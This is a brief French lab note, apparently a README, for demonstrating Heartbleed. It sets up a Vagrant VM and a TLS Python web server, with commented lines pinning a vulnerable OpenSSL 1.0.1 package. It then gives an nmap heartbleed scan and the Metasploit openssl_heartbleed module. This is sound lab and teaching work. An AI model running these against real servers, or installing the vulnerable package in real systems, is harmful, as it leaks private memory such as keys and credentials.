
```bash
vagrant up
vagrant ssh
#sudo apt-get update
#sudo apt-get remove openssl
#sudo apt-get install openssl=1.0.1-4ubuntu3
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

```
Modifier ip du serveur :

```python
# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('172.28.128.6', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

commande scan :

nmap -sV --script=ssl-heartbleed 172.28.128.6

Metasploit exploit : 

use auxiliary/scanner/ssl/openssl_heartbleed

CF. asciinema
